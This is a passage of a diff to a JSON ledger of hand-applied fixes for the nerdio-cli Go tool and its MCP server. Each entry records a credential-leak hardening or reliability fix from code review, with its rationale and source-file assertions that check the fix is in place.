+     "file": "cli/internal/cli/doctor.go",
+     "not_contains": "nerdio-cli auth setup"
+    },
+    {
      "file": "cli/internal/cli/helpers.go",
-     "not_contains": "\"error\": err.Error(),"
+     "not_contains": "nerdio-cli auth setup"
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "nerdio-cli auth setup"
+    }
+   ]
+  },
+  {
+   "id": "job-wait-stops-on-final-error",
+   "status": "active",
+   "summary": "`job wait` (and fan-run --wait) ends at once on a poll error no retry can change (the host guard's refusal, an HTTP 4xx other than 429) instead of polling three times with two full intervals between; 429, 5xx and network blips keep the tolerance of three",
+   "why": "The shipcheck sample probe timed out on `job wait` with no NERDIO_BASE_URL: every poll was refused and the loop slept the 10 s interval between tries. A wrong job id (404) or a missing role (403) waited the same way.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/nerdio_novel_helpers.go",
+     "contains": "func jobPollErrorIsFinal(err error) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_novel_helpers.go",
+     "contains": "if err != nil && jobPollErrorIsFinal(err) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/job_wait_test.go",
+     "contains": "func TestJobWaitStopsOnAFinalError(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "guard-refusal-is-final",
+   "status": "active",
+   "summary": "A request the host guard refuses (another host, the placeholder base URL, --dry-run) is reported at once: the guard's refusals are client.ErrHostPinRefused, which the client's retry loop treats as terminal",
+   "why": "The retry loop backed every guard refusal off three times (1 s + 2 s + 4 s, printing 'network error ..., retrying') before failing, on every command run without NERDIO_BASE_URL. Two anchored lines in client.go (terminalTransportRefusal, terminalSentinel; tools/apply_edits.py).",
+   "asserts": [
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "return errors.Is(err, ErrHostPinRefused) ||",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "case errors.Is(err, ErrHostPinRefused):",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/nerdio_token_url.go",
+     "contains": "var ErrHostPinRefused = errors.New(\"request refused by the host pin\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_guard.go",
+     "contains": "func (e guardRefusal) Is(target error) bool { return target == client.ErrHostPinRefused }",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_residuals_test.go",
+     "contains": "func TestGuardRefusalIsNotRetried(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "tenant-path-registered-at-any-status",
+   "status": "active",
+   "summary": "A response on a tenant-secret path is registered whatever its status: a 2xx answer as before (shown to the caller, withheld everywhere else); an error answer has its credential-named members held AND its secret members (credential-named or value-named, JSON or markup; never every word of an error page) registered, so no member on these paths is ever both unheld and unregistered",
+   "why": "Codex review round 2 P1 (class tenant secret written to disk; a regression of the round-1 2xx-only guard), fixed after the stop rule and NOT re-reviewed: MCP nerdio_read secure-variables.list answered HTTP 400 {\"error\":\"denied\",\"value\":\"ErrTenantSecret-29Oct\"} was neither held nor registered, so it was shown and then accepted back as `teach --notes <value>` and written to disk. Seen failing: seen/r2-tenant-path-any-status-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/nerdio_guard.go",
+     "contains": "cliutil.ShowTenantSecretMembers(plain, nerdioTenantSecretValueNames(req.URL.Path)...)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/nerdio_tenant_secrets.go",
+     "contains": "func ShowTenantSecretMembers(body []byte, valueNames ...string) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_r2_open_test.go",
+     "contains": "func TestR2TenantPathErrorResponseIsNeverUnheld(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "markup-walk-never-fails",
+   "status": "active",
+   "summary": "Markup in any response or text is walked by a lexer that cannot fail (start/end tags, comments, declarations, CDATA, text; a credential-named element marks its attributes and text up to its end tag or the end of the body) beside the strict decoder walk, which stops at its first error The lexer ends a name at '<' and an unterminated quote at the next '>', so a stray '<' or an unclosed attribute never hides the element after it.",
+   "why": "Codex review round 2 P1 (class holder incomplete), fixed after the stop rule and NOT re-reviewed: an HTTP 400 application/xml body <1><credentials><item>BadPrefixSecret-29Oct</item></credentials> printed the value in the `accounts` error output (the decoder rejected <1> and the walk stopped). Seen failing: seen/r2-markup-walk-never-fails-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cliutil/nerdio_names.go",
+     "contains": "func walkMarkupLexer(s string, secretName func(string) bool, hold func(string)) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/nerdio_names.go",
+     "contains": "walkMarkupLexer(s, secretName, hold)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/nerdio_r2_markup_test.go",
+     "contains": "func TestR2MarkupWalkSurvivesAParseError(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "baseline-is-an-mcp-read-flag",
+   "status": "active",
+   "summary": "`fleet autoscale-audit --baseline` (a local JSON file the command reads) is declared mcp:read-flags, so it is out of the MCP tool schema and a tool call naming it is refused",
+   "why": "check_mcp_file_flags.py (the replay's proof) found the novel's --baseline reachable over MCP at 4.34.2: the value reached the companion CLI, so a tool call could make the server read any file the account can. 4.34.2's native mechanism is the mcp:read-flags annotation on the command.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_autoscale_audit.go",
+     "contains": "\"mcp:read-flags\": \"baseline\"",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "token-saved-only-beside-its-pair",
+   "status": "active",
+   "summary": "Every token save (auth login, auth set-token, the automatic mint, the refresh grant) passes one gate in config.SaveTokens: a token is saved only beside the client pair it was minted for, or with no pair; a save that would leave it beside another stored pair is refused (config.ErrTokenPairNotStored). A stored Entra token whose own appid/azp claim names another client is never sent for the pair in effect (a second signal beside the files)",
+   "why": "Codex review r1 class token bound to another client pair: `auth login --client-id A ...` then `NERDIO_CLIENT_ID=B NERDIO_CLIENT_SECRET=... auth login` saved B's token beside A's stored pair (an environment pair never reaches the files), and the next run with no environment pair sent B's token for A. The refresh grant's save had the same shape. One anchored line in config.go (tools/apply_edits.py).",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if err := c.refuseTokenBesideAnotherPair(clientID, clientSecret, accessToken, refreshToken); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/nerdio_tokens.go",
+     "contains": "func (c *Config) refuseTokenBesideAnotherPair(clientID, clientSecret, accessToken, refreshToken string) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/nerdio_tokens.go",
+     "contains": "return ErrTokenPairNotStored",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/nerdio_tokens.go",
+     "contains": "func tokenIssuedTo(access string) (string, bool) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/nerdio_tokens.go",
+     "contains": "if issuedTo, ok := tokenIssuedTo(cfg.AccessToken); ok && !strings.EqualFold(issuedTo, id) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/nerdio_review4342_r1_test.go",
+     "contains": "func TestTokenIsSavedOnlyBesideThePairItWasMintedFor(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/nerdio_review4342_r1_test.go",
+     "contains": "func TestStoredTokenIssuedToAnotherClientIsNotSent(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "tenant-secrets-matched-at-every-length",
+   "status": "active",
+   "summary": "A tenant secret (LAPS password, BitLocker key, secure-variable value) of any length is withheld on every path that does not answer the caller (files, stderr, the store, an MCP child argv) by its own matcher (cliutil.Echoes: as written, inside any text, every encoding); the credential kit does not hold them, because the operator's own output shows them; a non-JSON tenant-secret body registers its secrets too (named markup subtrees, named lines and parameters, else every word); an error response on a tenant-secret path is held like any other",
+   "why": "Codex review r1 class tenant secret written to disk: a secret under six characters was matched only as a whole JSON string literal, so `secure-variables list --csv --select value --deliver file:` wrote it clear; a markup or text body on a tenant-secret path registered nothing at all.",
+   "asserts": [
+    {
+     "file": "cli/internal/cliutil/nerdio_tenant_secrets.go",
+     "contains": "return len(all) > 0 && text != \"\" && Echoes(text, all)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/nerdio_tenant_secrets.go",
+     "not_contains": "tenantSecretFloor"
+    },
+    {
+     "file": "cli/internal/cliutil/nerdio_tenant_secrets.go",
+     "contains": "func showTenantSecretsText(s string, named map[string]bool, everyWord bool) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_guard.go",
+     "contains": "!nerdioTenantSecretPath(req.Method, req.URL.Path) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/nerdio_review4342_r1_test.go",
+     "contains": "func TestShortTenantSecretWithheldInEveryRepresentation(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/nerdio_review4342_r1_test.go",
+     "contains": "func TestNonJSONTenantSecretBodiesAreRegistered(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-child-shows-no-tenant-secret",
+   "status": "active",
+   "summary": "A tenant secret is shown only by a process whose registry the MCP child-argv check reads: a mirrored CLI child (NERDIO_MCP_CHILD=1) holds every tenant secret it reads as a credential (minted:tenant-secret), so the credential kit withholds the unit that carries one from its stdout; the MCP server's in-process reads (nerdio_read) show and register them, and a child argv repeating one is refused",
+   "why": "Codex review r1 class tenant secret written to disk: the `export secure-variables` MCP tool (a mirrored child) showed the value, registered only in the child, so the server let the next call (`teach --notes <the value>`) write it into the learnings store and audit file.",
+   "asserts": [
+    {
+     "file": "cli/internal/cliutil/nerdio_tenant_secrets.go",
+     "contains": "if IsMCPChildEnv() {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/nerdio_tenant_secrets.go",
+     "contains": "Hold(\"minted:tenant-secret\", v)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/nerdioblackbox/nerdio_review4342_r1_test.go",
+     "contains": "func TestMCPChildShowsNoTenantSecretAndNoneReachesAFile(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "zoned-host-is-no-origin",
+   "status": "active",
+   "summary": "The origin pin folds only spellings the transport dials identically: a host carrying an IPv6 zone is no origin (it pins nothing and matches nothing), and a token URL with one is no token URL",
+   "why": "Codex review r1 class credential sent to another host: normalizedOrigin lowercased the zone, a case-sensitive interface name, so a 307 from https://[fe80::1%lan0] to https://[fe80::1%LAN0] passed the pin and the replayed provisioning link-tenant body (two access tokens) reached another peer.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/nerdio_guard.go",
+     "contains": "|| strings.Contains(u.Host, \"%\") {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/nerdio_token_url.go",
+     "contains": "c == '%' {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_review4342_r1_test.go",
+     "contains": "func TestZonedHostPinsNothing(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "host-estate-unavailable-not-running",
+   "status": "active",
+   "summary": "fleet host-estate reads an 'Unavailable' session host as not running ('unavailable' holds 'available')",
+   "why": "Codex review r1 P2 (wrong result, one-line fix).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_host_estate.go",
+     "contains": "!strings.Contains(strings.ToLower(state), \"unavailable\"))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_review4342_r1_test.go",
+     "contains": "func TestHostEstateUnavailableIsNotRunning(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "job-wait-timeout-ends-last-wait",
+   "status": "active",
+   "summary": "job wait (and fan-run --wait) ends its last wait at --timeout instead of sleeping a whole --interval past it",
+   "why": "Codex review r1 P2 (one-line fix): --timeout 1s --interval 1h slept an hour after a Running poll.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/nerdio_novel_helpers.go",
+     "contains": "case <-time.After(min(interval, time.Until(deadline))):",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_review4342_r1_test.go",
+     "contains": "func TestJobWaitTimeoutEndsTheLastWait(t *testing.T) {",
+     "code_only": true
     }
    ]
   },
@@ -827,6 +1467,481 @@
      "not_contains": "connects only to remote"
     }
    ]
+  },
+  {
+   "id": "credkit-wiring",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "The shared credential kit (tools/maintainer/credkit, vendored at cli/internal/credkit) is wired by hand and replaces this connector's own credential layer. internal/credwire/declarations.go holds the one Declarations literal; each main starts with credkit.Start and ends with credkit.Exit, and every exit of the MCP main returns through it; the API client (client.OutboundGuard, under the origin pin), feedback, deliver and probe clients go through credkit.Transport; every file write outside the 0600 credential store and config goes through the kit; the MCP stdio and HTTP servers pass credkit.MCPIn, MCPOut, MCPHTTP and MCPTools; the MCP mirror runs the CLI with credkit.RunCommand; isTerminal asks credkit.Terminal. The client pair and refresh token may go to base_url and Entra ID's sign-in hosts only; the minted token is held where it is minted (minted:access_token) and the pair where a mint starts (minted:client-pair). The kit's base_url is the one the run really uses (config.SelectedBaseURL for the last --config under the last --home, then NERDIO_BASE_URL), set for Start only and restored by credwire.AfterStart.",
+   "why": "One contract, one matcher and one set of sinks replace the connector-only copies, and a matcher fix reaches this connector by vendoring. Tests: internal/credwire/leak_test.go on the built binaries, each seen failing on the pre-kit build (.review/seen-*.log): a malformed config's credential in startup output, the client pair to a token URL on a third origin, a piece of the minted token echoed by a response, --stdin bodies and run profiles. The nerdioblackbox suite runs every output, file and network sink against an echoing fake and a quiet control. Retires secret-echo-decoded-funnel, output-chokepoint, file-sinks-withheld, store-never-keeps-secrets, mcp-protocol-messages-withheld, network-sinks-withheld, startup-output-held-first, mcp-held-arguments-refused, undecoded-encodings-every-alignment, held-forms-in-every-encoding, every-text-encoding-withheld, outbound-split-parts-refused, auth-carrier-names-and-shapes-held, derived-credential-parts-held, output-units-reassembled, journal-entry-withheld-as-written, base85-family-withheld, short-held-values-matched-anywhere, output-split-across-deliveries, holder-holds-every-credential-part, decoded-forms-withheld, markup-credential-subtree-held, response-credentials-held: replaced by the shared credential kit (entries removed: the ledger's retired list only takes retirements tools/maintainer/fleet_handfixes.json backs). Behavior change: a unit that carries a held value is withheld whole with the kit's notice, where the old layer redacted the value in place; a token URL on an origin other than base_url and Entra ID's hosts is refused. claimLegacyUnscopedDB reads its owner marker through filepath.Clean (the form blackpoint carries), because editing that function moved it off its reviewed G304 suppression.",
+   "spec_encode_followup": "Press-side: generate the kit wiring and the Declarations literal.",
+   "asserts": [
+    {
+     "file": "cli/cmd/nerdio-cli/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/nerdio-cli/main.go",
+     "contains": "credkit.Exit(code)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/nerdio-mcp/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/nerdio-mcp/main.go",
+     "contains": "credkit.Exit(run())",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/nerdio-mcp/main.go",
+     "contains": "server.WithToolHandlerMiddleware(credkit.MCPTools),",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/nerdio-mcp/main.go",
+     "contains": "credkit.MCPIn(os.Stdin), credkit.MCPOut()",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/nerdio-mcp/main.go",
+     "not_contains": "os.Exit("
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var Declarations = credkit.Declarations{",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "Files:            credentialFiles,",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "underHome(homes[len(homes)-1], func() { selectKitBaseURL(lastOf(configs)) })",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/credkit_hold.go",
+     "contains": "func SelectedBaseURL(configPath string) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "holdConfigCredentials(cfg)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "var OutboundGuard = credkit.Transport",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "Transport = guardTransport(tr)",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "cliutil.Hold(\"minted:access_token\", tokenResp.AccessToken)",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/client/nerdio_token_errors.go",
+     "contains": "cliutil.HoldValues(\"minted:client-pair\", clientID, clientSecret)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "cliutil.HoldValues(\"minted:access_token\", tok.AccessToken)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_guard.go",
+     "contains": "next = credkit.Transport(nil)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "credkit.Transport(nil)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "credkit.Transport(nil)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/probe.go",
+     "contains": "credkit.Transport(nil)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "return credkit.Terminal(f)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "credkit.RunCommand(cmd)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/profile.go",
+     "contains": "cliutil.WriteFile(tmpName, data, 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/paths.go",
+     "contains": "func AtomicWriteCredentialFile(path string, data []byte, fileMode, dirMode os.FileMode) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestMalformedConfigHeldBeforeStartupOutput(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestClientSecretOnlyReachesItsOrigins(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestMintedTokenHeld(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/nerdioblackbox/writers_test.go",
+     "contains": "func TestEveryFileWritePassesTheKit(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/nerdioblackbox/sinks_test.go",
+     "contains": "func TestEveryHTTPClientIsGuarded(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/nerdioblackbox/blackbox_test.go",
+     "contains": "func quietServer(t *testing.T) *server {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "os.ReadFile(filepath.Clean(markerPath))",
+     "min_count": 2,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-sqlite-every-handle",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "Every SQLite handle goes through credkit.SQLDriver: internal/credsql registers the one driver (with the tenant-secret write guard inside it) and every sql.Open in store.go and platform/migration.go names it, the read-only opener included. The MCP sql value cap is a DSN parameter credsql applies as each connection opens, since sqlite.Limit cannot reach a kit-wrapped connection; the read-only opener runs select 1 because the kit's connection does not forward Ping.",
+   "why": "A statement's text and bound values are a sink of their own, reads included.",
+   "spec_encode_followup": "Press-side: generate store, migration and MCP sql opens against one kit-wrapped driver name, and express the MCP sql value cap as a connection-open setting.",
+   "asserts": [
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "sql.Register(Driver, credkit.SQLDriver(guardDriver{cappedSQLite()}))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "func OpenReadOnlyValueCapped(dbPath string, maxValueBytes int) (*Store, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "sqlite.Limit("
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "openMCPReadOnlyStore(path, mcpSQLMaxValueBytes)",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-mcphttp-outermost",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "credkit.MCPHTTP writes every response the MCP HTTP server serves, refusals included. requireBearerAuthWithOrigins runs a preflight that writes nothing, then credkit.MCPHTTP around a gate that answers the Origin, bearer and body-limit verdicts.",
+   "why": "With the kit wrapping only the inner handler, a refusal answers outside it.",
+   "spec_encode_followup": "Press-side: generate the MCP HTTP auth wrapper so its refusals are written by the inner, kit-wrapped handler and only a write-free preflight runs before credkit.MCPHTTP.",
+   "asserts": [
+    {
+     "file": "cli/cmd/nerdio-mcp/main.go",
+     "contains": "kit := credkit.MCPHTTP(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/nerdio-mcp/main.go",
+     "contains": "kit.ServeHTTP(w, r)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestMCPHTTPRefusalsPassTheKit(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-exit-delivers-stderr",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "The MCP server parses its flags with ContinueOnError on a copy of the arguments: -h prints the usage and exits 0, a bad flag prints its error and exits 2, and every exit (an HTTP start without NERDIO_MCP_HTTP_TOKEN, a refused bind, a --config or --home it does not take) returns through credkit.Exit, which delivers stderr first.",
+   "why": "stderr is a pipe the kit drains on a goroutine; flag.Parse's own os.Exit left before the pipe delivered, so -h printed no usage and a refused start exited with no reason. TestMCPExitDeliversItsMessage builds the real binary (.exe on Windows) and was seen failing on the pre-kit build (.review/seen-mcp-exit-fail.log).",
+   "spec_encode_followup": "Press-side: generate the MCP main with ContinueOnError flag parsing and one exit path.",
+   "asserts": [
+    {
+     "file": "cli/cmd/nerdio-mcp/main.go",
+     "contains": "flag.CommandLine.Init(os.Args[0], flag.ContinueOnError)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/nerdio-mcp/main.go",
+     "contains": "if errors.Is(err, flag.ErrHelp) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/nerdio-mcp/main.go",
+     "contains": "nerdio-mcp takes no --config or --home",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/mcp_exit_test.go",
+     "contains": "func TestMCPExitDeliversItsMessage(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/binaries_test.go",
+     "contains": "filepath.Join(binDir, b.out+exe())",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credential-fields-masked-by-name",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "The declared response fields (access_token, refresh_token, id_token, accessToken, refreshToken, idToken, sessionToken) are held by the kit as a response passes its transport, and the client replaces each by name with \"[withheld]\" at its one success return and in an error body, so the rest of the answer (an AVD session, an account) stays usable. A tenant secret (LAPS password, BitLocker key, secure-variable value) is under none of these names and is shown to the caller who asked.",
+   "why": "A declared field's value is held, so without the replacement every sink would withhold the whole answer. TestDeclarationsMatchTheMaskedFields keeps the two lists one.",
+   "spec_encode_followup": "Press-side: generate a declared-field replacement at the client's success return from the spec's credential members.",
+   "asserts": [
+    {
+     "file": "cli/internal/client/nerdio_credential_fields.go",
+     "contains": "func maskCredentialFields(body []byte) []byte {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/nerdio_credential_fields.go",
+     "contains": "var MaskedResponseFields = []string{",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "json.RawMessage(maskCredentialFields(sanitizeJSONResponse(respBody)))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "string(maskCredentialFields(body))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestDeclarationsMatchTheMaskedFields(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/nerdioblackbox/blackbox_test.go",
+     "contains": "func TestOrdinaryRecordsStillPrint(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "stdin-body-declared",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "--stdin is a declared StdinFlag, so the kit holds a body whole and line by line before anything prints. cliutil.CompactStdinBody puts a JSON body on one line first, because a line of { alone collides with public text and refuses the start. feedback --stdin refuses instead of reporting a record the kit would withhold.",
+   "why": "A hand-written body parser was a second reader of what the kit already holds. The cost: a preview of a --stdin body, and a vendor answer repeating part of it, are withheld, and the write still happens.",
+   "spec_encode_followup": "Press-side: generate StdinFlags and the compaction with the kit wiring.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "StdinFlags:       []string{\"--stdin\"},",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "cliutil.CompactStdinBody(args)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_startup.go",
+     "contains": "func CompactStdinBody(args []string) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "feedback --stdin cannot record a note",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestStdinBodyHeldBeforeAPreview(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-profiles-held",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "A run profile store (profiles.json under the config dir and ~/.nerdio-cli) is read after the kit started, so the startup discovery holds what it keeps under a declared credential flag and the password and query values of a saved base-url (cliutil.HoldProfileStore, a token walk of profiles.<name>.values.<flag>). A profile's name and its other values stay data.",
+   "why": "The kit's own file reader would hold every string of this nested JSON, so a profile named p or a saved --limit 7 would refuse every later start. TestRunProfileCredentialsHeldAtStartup was seen failing on the pre-kit build.",
+   "spec_encode_followup": "Press-side: generate the profile store's holder from the declared credential flags.",
+   "asserts": [
+    {
+     "file": "cli/internal/cliutil/credkit_startup.go",
+     "contains": "func HoldProfileStore(data []byte, flags []string) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "cliutil.HoldProfileStoreFile(",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestRunProfileCredentialsHeldAtStartup(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "journal-credential-hardening",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "The learn journal minimizes what it keeps: an override session id is stored hashed (o:<hash>), failed_flag is kept only when it is a near miss of a declared flag, and teach's and playbook amend's missing --query log lines count the arguments instead of repeating them. Everything else that reaches a journal line passes the kit's file sink.",
+   "why": "A credential typed where a flag goes, or set as a session label, is not a value the kit has held, so the structural rules must keep it out on their own (playbook amend repeated its arguments into teach.log).",
+   "spec_encode_followup": "Press-side: generate the hashed session key, the declared-only failed flag and the counted teach log lines.",
+   "asserts": [
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func JournalFailedFlag(failed, suggested string, declared []string) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\"o:\" + hashHarnessSession(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "not_contains": "HeldEchoes"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "learn.JournalFailedFlag(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalCredentialHardening(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "missing --query (%d args, %d resources)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "contains": "missing --query (%d args)",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "set-token-argument-never-echoed",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "auth set-token takes no arguments and refuses one with a fixed message: the token is piped on stdin. cobra.NoArgs repeats the argument in its error, so a token typed as an argument would print before any source held it.",
+   "why": "An argument is no declared credential source, so the kit cannot hold it; the refusal must not repeat it.",
+   "spec_encode_followup": "Press-side: generate set-token's argument refusal without echoing the argument.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "auth set-token takes no arguments: pipe the token on stdin",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-hang-detected-by-deadline",
+   "class": "test-reliability",
+   "status": "active",
+   "summary": "TestMirroredDestructiveCommandRefusesWithoutYes detects a hung confirm-less child by its context deadline firing (60 s), not by a 2 s wall-clock bound.",
+   "why": "A freshly built probe can take more than 2 s to start on a loaded Windows runner without hanging (PR #577 Windows row: 2.4 s). A hung child only ends when the deadline kills it, so ctx.Err() is the exact hang signal. Proved both ways: a 2.5 s child fails the old check and passes this one; a child that never returns fails this one at the deadline.",
